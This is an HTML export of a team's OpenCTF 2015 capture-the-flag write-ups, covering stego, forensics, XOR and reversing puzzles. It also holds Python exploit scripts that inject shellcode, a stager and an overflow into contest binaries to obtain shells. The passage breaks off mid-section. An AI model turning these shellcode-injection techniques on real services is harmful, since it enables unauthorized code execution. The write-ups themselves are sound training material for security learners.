<html><head><title>openctf 2015 write-ups</title><meta content="text/html; charset=UTF-8" http-equiv="content-type"><style type="text/css">ol.lst-kix_fhzjslyfmx0h-5.start{counter-reset:lst-ctn-kix_fhzjslyfmx0h-5 0}.lst-kix_fhzjslyfmx0h-2>li{counter-increment:lst-ctn-kix_fhzjslyfmx0h-2}ol.lst-kix_fhzjslyfmx0h-0.start{counter-reset:lst-ctn-kix_fhzjslyfmx0h-0 0}ol.lst-kix_fhzjslyfmx0h-7{list-style-type:none}ol.lst-kix_fhzjslyfmx0h-6{list-style-type:none}.lst-kix_fhzjslyfmx0h-4>li:before{content:"" counter(lst-ctn-kix_fhzjslyfmx0h-4,lower-latin) ". "}ol.lst-kix_fhzjslyfmx0h-5{list-style-type:none}ol.lst-kix_fhzjslyfmx0h-4{list-style-type:none}ol.lst-kix_fhzjslyfmx0h-4.start{counter-reset:lst-ctn-kix_fhzjslyfmx0h-4 0}.lst-kix_fhzjslyfmx0h-3>li:before{content:"" counter(lst-ctn-kix_fhzjslyfmx0h-3,decimal) ". "}ol.lst-kix_fhzjslyfmx0h-8{list-style-type:none}.lst-kix_fhzjslyfmx0h-1>li:before{content:"" counter(lst-ctn-kix_fhzjslyfmx0h-1,lower-latin) ". "}.lst-kix_fhzjslyfmx0h-0>li{counter-increment:lst-ctn-kix_fhzjslyfmx0h-0}ol.lst-kix_fhzjslyfmx0h-2.start{counter-reset:lst-ctn-kix_fhzjslyfmx0h-2 0}.lst-kix_fhzjslyfmx0h-0>li:before{content:"" counter(lst-ctn-kix_fhzjslyfmx0h-0,decimal) ". "}.lst-kix_fhzjslyfmx0h-2>li:before{content:"" counter(lst-ctn-kix_fhzjslyfmx0h-2,lower-roman) ". "}ol.lst-kix_fhzjslyfmx0h-3{list-style-type:none}.lst-kix_fhzjslyfmx0h-6>li{counter-increment:lst-ctn-kix_fhzjslyfmx0h-6}ol.lst-kix_fhzjslyfmx0h-2{list-style-type:none}ol.lst-kix_fhzjslyfmx0h-7.start{counter-reset:lst-ctn-kix_fhzjslyfmx0h-7 0}ol.lst-kix_fhzjslyfmx0h-1{list-style-type:none}.lst-kix_fhzjslyfmx0h-3>li{counter-increment:lst-ctn-kix_fhzjslyfmx0h-3}ol.lst-kix_fhzjslyfmx0h-0{list-style-type:none}.lst-kix_fhzjslyfmx0h-4>li{counter-increment:lst-ctn-kix_fhzjslyfmx0h-4}ol.lst-kix_fhzjslyfmx0h-6.start{counter-reset:lst-ctn-kix_fhzjslyfmx0h-6 0}ol.lst-kix_fhzjslyfmx0h-1.start{counter-reset:lst-ctn-kix_fhzjslyfmx0h-1 0}.lst-kix_fhzjslyfmx0h-1>li{counter-increment:lst-ctn-kix_fhzjslyfmx0h-1}ol.lst-kix_fhzjslyfmx0h-8.start{counter-reset:lst-ctn-kix_fhzjslyfmx0h-8 0}.lst-kix_fhzjslyfmx0h-7>li{counter-increment:lst-ctn-kix_fhzjslyfmx0h-7}.lst-kix_fhzjslyfmx0h-5>li:before{content:"" counter(lst-ctn-kix_fhzjslyfmx0h-5,lower-roman) ". "}ol.lst-kix_fhzjslyfmx0h-3.start{counter-reset:lst-ctn-kix_fhzjslyfmx0h-3 0}.lst-kix_fhzjslyfmx0h-6>li:before{content:"" counter(lst-ctn-kix_fhzjslyfmx0h-6,decimal) ". "}.lst-kix_fhzjslyfmx0h-7>li:before{content:"" counter(lst-ctn-kix_fhzjslyfmx0h-7,lower-latin) ". "}.lst-kix_fhzjslyfmx0h-5>li{counter-increment:lst-ctn-kix_fhzjslyfmx0h-5}.lst-kix_fhzjslyfmx0h-8>li:before{content:"" counter(lst-ctn-kix_fhzjslyfmx0h-8,lower-roman) ". "}.lst-kix_fhzjslyfmx0h-8>li{counter-increment:lst-ctn-kix_fhzjslyfmx0h-8}ol{margin:0;padding:0}.c0{orphans:2;widows:2;direction:ltr}.c3{background-color:#ffffff;max-width:451.4pt;padding:72pt 72pt 72pt 72pt}.c4{padding:0;margin:0}.c5{margin-left:36pt;padding-left:0pt}.c6{background-color:#ffffff;color:#212121}.c1{page-break-after:avoid}.c2{height:11pt}.title{padding-top:0pt;color:#000000;font-size:21pt;padding-bottom:0pt;font-family:"Trebuchet MS";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:13pt;padding-bottom:10pt;font-family:"Trebuchet MS";line-height:1.15;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:10pt;color:#000000;font-size:16pt;padding-bottom:0pt;font-family:"Trebuchet MS";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:10pt;color:#000000;font-weight:bold;font-size:13pt;padding-bottom:0pt;font-family:"Trebuchet MS";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:8pt;color:#666666;font-weight:bold;font-size:12pt;padding-bottom:0pt;font-family:"Trebuchet MS";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:8pt;color:#666666;text-decoration:underline;font-size:11pt;padding-bottom:0pt;font-family:"Trebuchet MS";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:8pt;color:#666666;font-size:11pt;padding-bottom:0pt;font-family:"Trebuchet MS";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:8pt;color:#666666;font-size:11pt;padding-bottom:0pt;font-family:"Trebuchet MS";line-height:1.15;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="c3"><p class="c0 c2"><span></span></p><p class="c0 c2"><span></span></p><p class="c0 c1 title"><a name="h.u3gbx2i7y8er"></a><span>OpenCTF 2015 write-ups [vulscryptos]</span></p><p class="c0"><span>vulscryptos scored 1910 pts, ranked 4th. So close!</span></p><p class="c0"><span>It was great fun. Many thanks to the organizers!</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 273.68px; height: 205.50px;"><img alt="" src="images/image01.jpg" style="width: 273.68px; height: 205.50px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 320.22px; height: 205.50px;"><img alt="" src="images/image08.png" style="width: 320.22px; height: 205.50px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0 c2"><span></span></p><p class="c0 c2"><span></span></p><p class="c0 c2"><span></span></p><h1 class="c0 c1"><a name="h.zd19tq1a7oqq"></a><span>37. Sanity Check (trivia 10)</span></h1><p class="c0"><span>Hack the Planet!</span></p><p class="c0 c2"><span></span></p><h1 class="c0 c1"><a name="h.rr2nsalyxkt3"></a><span>7. Runic Power (binary, exploitation, pwnable 200)</span></h1><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 361.00px; height: 343.00px;"><img alt="" src="images/image06.png" style="width: 361.00px; height: 343.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span>This program:</span></p><ol class="c4 lst-kix_fhzjslyfmx0h-0 start" start="1"><li class="c0 c5"><span>creates a new [rwx] page using mmap</span></li><li class="c0 c5"><span>reads from stdin into allocated memory</span></li><li class="c0 c5"><span>calls allocated address</span></li></ol><p class="c0 c2"><span></span></p><p class="c0"><span>so I just wrote this exploit code and I got a shell.</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>---</span></p><p class="c0"><span>#!/usr/bin/env python</span></p><p class="c0"><span>from ebil import * # https://github.com/193s/ebil</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>exec ebil(&#39;./runic_power&#39;, remote=(&#39;10.0.66.71&#39;, 6698))</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>payload = asm(shellcraft.sh())</span></p><p class="c0"><span>send(payload, 0x40)</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>r.interactive()</span></p><p class="c0"><span>---</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>SRSLY_this_was_trivial_for_x86</span></p><p class="c0 c2"><span></span></p><p class="c0 c2"><span></span></p><p class="c0 c2"><span></span></p><h1 class="c0 c1"><a name="h.n51vvuigumqu"></a><span>8. Sigil of Darkness (binary, exploitation, pwnable 200)</span></h1><p class="c0 c2"><span></span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 308.00px; height: 688.00px;"><img alt="" src="images/image00.png" style="width: 308.00px; height: 688.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0 c2"><span></span></p><p class="c0"><span>This program looks similar to runic_power,</span></p><p class="c0"><span>but it only reads 0x10 bytes from stdin, so I used a stager to bypass it.</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>---</span></p><p class="c0"><span>#!/usr/bin/env python</span></p><p class="c0"><span>from ebil import * # https://github.com/193s/ebil</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>exec ebil(&#39;./sigil_of_darkness&#39;, remote=(&#39;10.0.66.72&#39;, 6611))</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>shellcode = asm(shellcraft.amd64.sh(), arch=&#39;amd64&#39;)</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>def a(s):</span></p><p class="c0"><span>&nbsp; return asm(s, arch=&#39;amd64&#39;)</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>payload = &#39;&#39;</span></p><p class="c0 c2"><span></span></p><p class="c0"><span># rdi: 0</span></p><p class="c0"><span># rsi: base addr</span></p><p class="c0 c2"><span></span></p><p class="c0"><span># stager</span></p><p class="c0"><span>payload += chain([</span></p><p class="c0"><span>&nbsp; a(&quot;mov rax, rsi&quot;),</span></p><p class="c0"><span>&nbsp; a(&quot;mov edx, 0x100&quot;),</span></p><p class="c0"><span>&nbsp; a(&quot;mov esi, 0x400614&quot;),</span></p><p class="c0"><span>&nbsp; a(&quot;jmp rsi&quot;),</span></p><p class="c0"><span>])</span></p><p class="c0 c2"><span></span></p><p class="c0 c2"><span></span></p><p class="c0"><span>send(payload, 0x10)</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>r.send(shellcode)</span></p><p class="c0"><span>r.interactive()</span></p><p class="c0"><span>---</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>So_that_might_have_given10s_moreFFRT</span></p><p class="c0 c2"><span></span></p><p class="c0 c2"><span></span></p><h1 class="c0 c1"><a name="h.wuahqbchgf3a"></a><span>35.forbearance (reversing, binary, scripting 50)</span></h1><p class="c0"><span>A simple Windows binary challenge.</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>This binary asks me whether I agree to a &quot;license agreement&quot; or not.</span></p><p class="c0"><span>When I choose &quot;Yes&quot;, the binary creates a bitmap image called &quot;Y29uc3VtZXIgZW5oYW5jZW1lbnQ=&quot;. I opened the file with a binary editor, and found the flag written in plain text.</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 602.00px; height: 729.33px;"><img alt="" src="images/image02.png" style="width: 602.00px; height: 729.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span>FL@G[$ha11 we p1@y @ g@me?]</span></p><p class="c0 c2"><span></span></p><p class="c0 c2"><span></span></p><h1 class="c0 c1"><a name="h.vv9duypkb4rd"></a><span>34. absence (scripting, misc 200)</span></h1><p class="c0"><span>It looked like both C and whitespace source code, so I just put it through a C compiler and whitespace interpreter.</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>193s@mbp193s:~/CTF/openctf/absence$ gcc absence.c</span></p><p class="c0"><span>193s@mbp193s:~/CTF/openctf/absence$ ./a.out</span></p><p class="c0"><span>f1@g[This is not the code you&#39;re</span></p><p class="c0"><span>193s@mbp193s:~/CTF/openctf/absence$ wspace absence.c</span></p><p class="c0"><span>&nbsp;lo0kin-fo]%</span></p><p class="c0 c2"><span></span></p><p class="c0 c2"><span></span></p><p class="c0"><span>f1@g[This is not the code you&#39;re lo0kin-fo]</span></p><p class="c0 c2"><span></span></p><p class="c0 c2"><span></span></p><h1 class="c0 c1"><a name="h.68qzhzbok7ov"></a><span>1. magic_eye.dat (stego, forensics 50)</span></h1><p class="c0"><span>The file is a PNG image.</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 173.76px; height: 172.50px;"><img alt="" src="images/image05.png" style="width: 173.76px; height: 172.50px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span>I tried a steganography approach, and it turns out that the pixel bytes were compressed text.</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>```</span></p><p class="c0"><span>&gt;&gt;&gt; print open(&ldquo;magic_eye.dat&rdquo;, &ldquo;rb&rdquo;).read()[41:].decode(&ldquo;zlib&rdquo;)</span></p><p class="c0"><span>(snip)</span></p><p class="c0"><span>BTW the flag is some_flag_goes_here</span></p><p class="c0"><span>(snip)</span></p><p class="c0"><span>```</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>some_flag_goes_here</span></p><p class="c0 c2"><span></span></p><p class="c0 c2"><span></span></p><p class="c0 c2"><span></span></p><h1 class="c0 c1"><a name="h.arr4xp645ehf"></a><span>3. Enhance (misc, forensics, CSI 50)</span></h1><p class="c0"><span>I found a QR code in the right eye of the woman, so I photoshopped and scanned it :)</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>before:</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 328.50px; height: 309.38px;"><img alt="" src="images/image09.png" style="width: 328.50px; height: 309.38px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span>after:</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 344.00px; height: 339.00px;"><img alt="" src="images/image07.png" style="width: 344.00px; height: 339.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span>Ju5tPr1ntTheDAmNTh1n6</span></p><p class="c0 c2"><span></span></p><p class="c0 c2"><span></span></p><p class="c0 c2"><span></span></p><p class="c0 c2"><span></span></p><h1 class="c0 c1"><a name="h.w8x5oe2df0mr"></a><span>5. much_nothing (suchforensics,verymisc,wow 100)</span></h1><p class="c0"><span>The text file is from the script for &ldquo;Much Ado About Nothing&rdquo; by Shakespeare, but some of the spaces were converted to tabs or removed. At a certain point in the text, spaces and tabs stopped appearing completely, so I thought that that the spaces and tabs were some sort of encoded data, and that the other alphametical characters didn&rsquo;t matter.</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>So, I extracted all whitespace and converted spaces to 0 and tabs to 1 in binary.</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>---</span></p><p class="c0"><span>#!/usr/bin/env python</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>s = open(&quot;shakespeare-much-3.txt&quot;).read()</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>txt = &#39;&#39;</span></p><p class="c0"><span>for c in s:</span></p><p class="c0"><span>&nbsp; if c == &#39; &#39; or c == &#39;\t&#39;:</span></p><p class="c0"><span>&nbsp; &nbsp; txt += str(0 if c == &#39; &#39; else 1)</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>#print txt</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>z = (&quot;%x&quot; % eval(&quot;0b&quot;+txt)).decode(&#39;hex&#39;)</span></p><p class="c0"><span>open(&quot;out&quot;, &quot;w&quot;).write(z)</span></p><p class="c0"><span>---</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>This gave me a zip file so I unzipped it and got flag.txt.</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>_h0m3_br3w_wh1t3_sp4c3_enC0ding_i5_ub3r_1337_</span></p><p class="c0 c2"><span></span></p><h1 class="c0 c1"><a name="h.wscku93up8ki"></a><span>6. Pillars of CTF (network,crypto,binary,forensics 150)</span></h1><p class="c0"><span>Everything in phase1 was also in phase1.key, and phase1.key had 256 lines.</span></p><p class="c0"><span>So, I converted each piece of text in phase1 into the line number of phase1.key as a byte.</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>---</span></p><p class="c0"><span>#!/usr/bin/env python</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>cip = open(&#39;./phase1&#39;).read().split(&#39;\n&#39;)</span></p><p class="c0"><span>key = open(&#39;./phase1.key&#39;).read().split(&#39;\n&#39;)</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>flag = &#39;&#39;</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>for c in cip:</span></p><p class="c0"><span>&nbsp; if c == &#39;&#39;: continue</span></p><p class="c0"><span>&nbsp; t = key.index(c)</span></p><p class="c0"><span>&nbsp; flag += chr(t)</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>open(&#39;out&#39;, &#39;w&#39;).write(flag)</span></p><p class="c0"><span>---</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>Then, I got a 64 bit ELF file; another challenge.</span></p><p class="c0"><span>It asked for a password, so I just `strings`ed it and got it: Banana1</span></p><p class="c0"><span>Entering the password gave me two sets of long base64-encoded texts for Phase 3 and Phase 4.</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>Phase 3 was a pcap file with a </span><span class="c6">series of tcp packets containing fragments of a png file; skipped it.</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>Phase 4 looked like an ELF file, but with headers and some strings modified.</span></p><p class="c0"><span>The errata &ldquo;Key for phase four&rdquo; suggested that Phase 4 was in a format that requires a key, and I supposed that this was a repeated-xor key!</span></p><p class="c0 c2"><span></span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 355.50px; height: 359.04px;"><img alt="" src="images/image03.png" style="width: 355.50px; height: 359.04px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0 c2"><span></span></p><p class="c0"><span>I noticed that 00010203 appears repeatedly, so I figured it must be a repeated-xor key.</span></p><p class="c0 c2"><span></span></p><p class="c0 c2"><span></span></p><p class="c0"><span>---</span></p><p class="c0"><span>#!/usr/bin/env python</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>f = open(&quot;4&quot;).read()</span></p><p class="c0"><span>key = &#39;\x00\x01\x02\x03&#39;</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>print &#39;&#39;.join([chr(ord(f[i])^ord(key[i%len(key)])) for i in xrange(len(f))])</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>---</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>Ltracing the ELF Binary I got gave me the flag :)</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>---</span></p><p class="c0"><span>master@ubuntu:~/CTF/openctf/pillars/stage2/4$ ./elf</span></p><p class="c0"><span>I&#39;m thinking of a key...</span></p><p class="c0"><span>master@ubuntu:~/CTF/openctf/pillars/stage2/4$ ltrace ./elf</span></p><p class="c0"><span>__libc_start_main(0x4007c0, 1, 0x7ffed1456188, 0x400820 &lt;unfinished ...&gt;</span></p><p class="c0"><span>memcpy(0x7ffed1456070, &quot;\2677\226\256\366\302\372\357\020]5\335\212\346\332\340-\243\304\v\271:x\333\245\0\0\0\0\0\0\0&quot;..., 42) = 0x7ffed1456070</span></p><p class="c0"><span>memcpy(0x7ffed1456010, &quot;\nX\031\366\354a\315\027\0237\027\306\205\033YL@I\274}\233)g\234R\0\0\0\0\0\0\0&quot;..., 42) = 0x7ffed1456010</span></p><p class="c0"><span>memcpy(0x7ffed1455f80, &quot;\351\035\372=E\353^\210p\036Gi|\242\326\337\b\265:\023Vrr&amp;\217\0\0\0\0\0\0\0&quot;..., 42) = 0x7ffed1455f80</span></p><p class="c0"><span>strlen(&quot;The key is: %s\n&quot;) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = 15</span></p><p class="c0"><span>snprintf(&quot;The key is: True_Hipsters_Use_Be&quot;..., 55, &quot;The key is: %s\n&quot;, &quot;True_Hipsters_Use_Betamax&quot;) = 38</span></p><p class="c0"><span>printf(&quot;I&#39;m thinking of a key...\n&quot;I&#39;m thinking of a key...</span></p><p class="c0"><span>) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = 25</span></p><p class="c0"><span>+++ exited (status 0) +++</span></p><p class="c0"><span>---</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>True_Hipsters_Use_Betamax</span></p><p class="c0 c2"><span></span></p><p class="c0 c2"><span></span></p><h1 class="c0 c1"><a name="h.up1p1xe64wef"></a><span>2. moonwalk (forensics, reversing 50)</span></h1><p class="c0 c2"><span></span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 602.00px; height: 134.67px;"><img alt="" src="images/image10.png" style="width: 602.00px; height: 134.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span>Opening the file in a binary editor shows that this was a &ldquo;reversed&rdquo; PK ( = ZIP) file. Uncompressed reversed file and read metsys.elif.</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 602.00px; height: 81.33px;"><img alt="" src="images/image04.png" style="width: 602.00px; height: 81.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span>This was a reversed disk image, so I reversed it again and opened it with Autopsy.</span></p><p class="c0"><span>This gave me a file called &ldquo;txt.galf&rdquo;. &quot;txt.galf&quot; is the reverse of &quot;flag.txt&quot;, so...</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>&quot;txt.galf&quot; looks like this:</span></p><p class="c0"><span>$ xxd txt.galf</span></p><p class="c0"><span>0000000: f597 4377 16f5 b613 4377 f546 e616 f544 &nbsp;..Cw....Cw.F...D</span></p><p class="c0"><span>0000010: e657 0327 14f5 e627 5773 f573 5357 a6f5 &nbsp;.W.&#39;...&#39;Ws.sSW..</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>After a few tries, I noticed that if I swap the 4 lower bits with the 4 higher bits of each byte, every byte would become an ASCII character.</span></p><p class="c0"><span>$ xxd flag.txt</span></p><p class="c0"><span>0000000: 5f79 3477 615f 6b31 3477 5f64 6e61 5f44 &nbsp;_y4wa_k14w_dna_D</span></p><p class="c0"><span>0000010: 6e75 3072 415f 6e72 7537 5f37 3575 6a5f &nbsp;nu0rA_nru7_75uj_</span></p><p class="c0"><span>Hmm, just one more step.</span></p><p class="c0"><span>Reverse the string and....</span></p><p class="c0"><span>$ cat flag.txt | rev | xxd</span></p><p class="c0"><span>0000000: 5f6a 7535 375f 3775 726e 5f41 7230 756e &nbsp;_ju57_7urn_Ar0un</span></p><p class="c0"><span>0000010: 445f 616e 645f 7734 316b 5f61 7734 795f &nbsp;D_and_w41k_aw4y_</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>Here&rsquo;s the flag.</span></p><p class="c0"><span>_ju57_7urn_Ar0unD_and_w41k_aw4y_</span></p><p class="c0 c2"><span></span></p><p class="c0 c2"><span></span></p><h1 class="c0 c1"><a name="h.vqh0rcunz868"></a><span>27. Witches Cat (binary,exploitation,pwnable 350)</span></h1><p class="c0 c2"><span></span></p><p class="c0"><span>Giving a very long name to `Cat` gave me the flag :)</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>---</span></p><p class="c0"><span>#!/usr/bin/env python</span></p><p class="c0"><span>from ebil import * # https://github.com/193s/ebil</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>exec ebil(&#39;./witches_cat&#39;, remote=(&#39;10.0.66.73&#39;, 6604))</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>def cmd(cmd):</span></p><p class="c0"><span>&nbsp; print r.recvuntil(&#39;# &#39;)</span></p><p class="c0"><span>&nbsp; r.sendline(cmd)</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>def scoop(): &nbsp; &nbsp; cmd(&#39;scoop&#39;)</span></p><p class="c0"><span>def addCat(): &nbsp; &nbsp;cmd(&#39;addCat&#39;)</span></p><p class="c0"><span>def removeCat(): cmd(&#39;removeCat&#39;)</span></p><p class="c0"><span>def cmd_exit(): &nbsp;cmd(&#39;exit&#39;)</span></p><p class="c0"><span>def nameCat(name):</span></p><p class="c0"><span>&nbsp; cmd(&#39;nameCat %s&#39; % name)</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>addCat()</span></p><p class="c0"><span>nameCat(&#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;)</span></p><p class="c0"><span>removeCat()</span></p><p class="c0"><span>print r.recv()</span></p><p class="c0"><span>---</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>hur_hurr_hurr_MEOW_AAAA</span></p><p class="c0 c2"><span></span></p><h1 class="c0 c1"><a name="h.iv764t4mg58j"></a><span>22. blackSmoke - highLow (exploitation,binary,reversing,pwnable </span><span>300)</span></h1><p class="c0"><span>An ELF binary challenge.</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>After doing some reverse-engineering with IDA, I found that the executable follows 7 steps described below:</span></p><p class="c0"><span>1. Connect to 10.0.66.77:11113, send &quot;BLSS\x02&quot;, and receive machine code for DRM.</span></p><p class="c0"><span>2. Execute code received in Step 1.</span></p><p class="c0"><span>3. Connect to 10.0.66.76:11112, send &quot;GETGAMES\n&quot;, and receive machine code which lists games available.</span></p><p class="c0"><span>4. Execute code received in Step 3.</span></p><p class="c0"><span>5. Ask the player to choose a game. (&quot;highLow&quot; is the only option.)</span></p><p class="c0"><span>6. Connect to 10.0.66.76:11112 again to &nbsp;send player&#39;s choice and receive machine code for the game.</span></p><p class="c0"><span>7. Execute code received in Step 6.</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>I dumped the code received at Step 1, 3, and 6, and opened them with IDA.</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>In the code received in Step 6:</span></p><p class="c0"><span>---</span></p><p class="c0"><span>if(win_count &gt; 99){</span></p><p class="c0"><span>&nbsp; write(fd[1][1], &quot;KEYREQ&quot;, 6);</span></p><p class="c0"><span>&nbsp; printf(&quot;Here&#39;s the key: &nbsp;&quot;);</span></p><p class="c0"><span>&nbsp; read(fd[0][0], buf, 20);</span></p><p class="c0"><span>&nbsp; printf(buf);</span></p><p class="c0"><span>&nbsp; printf(&quot;\n&quot;);</span></p><p class="c0"><span>&nbsp; printf(&quot;\n&quot;);</span></p><p class="c0"><span>}</span></p><p class="c0"><span>---</span></p><p class="c0"><span>This part is sending &quot;KEYREQ&quot; somewhere to get the key. But where is fd[1][1] connecting to?</span></p><p class="c0 c2"><span></span></p><p class="c0"><span>After doing some more reversing, I found the string &quot;KEYREQ&quot; in code received at Step 1.</span></p><p class="c0"><span>---</span></p><p 